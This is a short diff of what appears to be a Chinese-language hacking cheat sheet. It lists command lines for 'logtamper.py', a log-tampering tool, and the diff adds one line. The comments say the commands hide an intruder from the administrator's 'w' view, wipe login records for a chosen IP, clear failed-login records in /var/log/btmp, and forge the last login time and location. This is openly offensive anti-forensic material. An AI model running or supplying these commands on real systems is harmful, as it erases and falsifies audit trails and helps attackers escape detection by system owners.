@@ -59,6 +59,7 @@ wtmpclean
 logtamper
 
 > python logtamper.py -m 1 -u b4dboy -i 192.168.1.110  //躲避管理员w查看
-> python logtamper.py -m 2 -u b4dboy -i 192.168.1.110  //清除指定ip的登录日志
+> python logtamper.py -m 2 -u b4dboy -i 192.168.1.110  //清除指定的登录日志
+> python logtamper.py -m 2 -f /var/log/btmp -u b4dboy -i 192.168.1.110  //清除指定的登录失败记录
 > python logtamper.py -m 3 -u b4dboy -i 192.168.1.110 -t tty1 -d 2018:10:27:10:11:12  //修改上次登录时间地点
 </pre>
